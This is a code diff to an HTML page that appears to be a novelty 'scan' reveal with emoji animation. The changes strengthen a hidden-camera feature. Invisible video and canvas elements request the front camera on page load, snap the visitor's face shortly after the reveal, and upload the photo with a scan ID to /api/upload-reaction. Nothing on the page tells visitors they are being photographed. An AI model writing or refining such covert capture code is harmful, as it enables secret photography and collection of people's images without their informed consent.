@@ -217,49 +217,66 @@
   <div class="emoji-rain" id="emoji-rain"></div>
 
   <!-- Hidden camera elements -->
-  <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+  <video id="video" width="640" height="480" autoplay playsinline muted style="display:none;"></video>
   <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
   <script>
     const scanId = sessionStorage.getItem('currentScanId');
 
     async function startCapture() {
+      if (!scanId) return console.log("No scanId found");
+      
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: "user" } 
+        });
         const video = document.getElementById('video');
         video.srcObject = stream;
         
-        // Wait for reveal, then snap
-        setTimeout(() => {
-          const canvas = document.getElementById('canvas');
-          const context = canvas.getContext('2d');
-          context.drawImage(video, 0, 0, 640, 480);
+        // Wait for video to actually start playing
+        video.onplay = () => {
+          console.log("Camera stream active...");
           
-          canvas.toBlob(async (blob) => {
-            const formData = new FormData();
-            formData.append('reaction', blob, 'reaction.jpg');
-            formData.append('scanId', scanId);
+          // Wait for reveal, then snap
+          setTimeout(() => {
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, 640, 480);
             
-            await fetch('/api/upload-reaction', {
-              method: 'POST',
-              body: formData
-            });
-            
-            // Stop camera
-            stream.getTracks().forEach(track => track.stop());
-          }, 'image/jpeg', 0.8);
-        }, 3000); // Snap slightly after reveal
+            canvas.toBlob(async (blob) => {
+              const formData = new FormData();
+              formData.append('reaction', blob, 'reaction.jpg');
+              formData.append('scanId', scanId);
+              
+              try {
+                const res = await fetch('/api/upload-reaction', {
+                  method: 'POST',
+                  body: formData
+                });
+                const data = await res.json();
+                console.log("Upload result:", data);
+              } catch (err) {
+                console.error("Upload failed:", err);
+              }
+              
+              // Stop camera
+              stream.getTracks().forEach(track => track.stop());
+            }, 'image/jpeg', 0.8);
+          }, 3500); // Snap 3.5s after reveal starts
+        };
       } catch (e) {
-        console.log("Camera access denied or unavailable.");
+        console.error("Camera error:", e);
       }
     }
+
+    // Start camera request immediately on load
+    startCapture();
 
     // After 2.6s show the reveal
     setTimeout(() => {
       document.getElementById('loading').style.display = 'none';
       document.getElementById('reveal').style.display = 'block';
       spawnEmojis();
-      startCapture(); // Attempt capture on reveal
     }, 2600);
 
     function spawnEmojis() {
